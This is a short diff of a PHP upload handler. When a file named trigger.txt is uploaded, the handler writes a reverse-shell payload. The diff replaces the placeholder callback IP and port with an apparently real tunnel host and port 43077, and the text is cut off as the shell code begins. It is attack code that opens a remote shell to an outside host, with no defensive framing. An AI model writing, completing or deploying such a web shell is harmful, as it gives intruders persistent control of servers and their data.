@@ -7,8 +7,8 @@ if (isset($_FILES['f'])) {
 
         // Optional: Drop a reverse shell if uploaded file is a trigger (e.g., trigger.txt)
         if ($target === "trigger.txt") {
-            $ip = 'YOUR_IP';      // 🛠️ CHANGE THIS
-            $port = '4444';       // 🛠️ CHANGE THIS
+            $ip = 'figure-traveling.gl.at.ply.gg';      // 🛠️ CHANGE THIS
+            $port = '43077';       // 🛠️ CHANGE THIS
 
             $shell = "<?php
             set_time_limit (0);
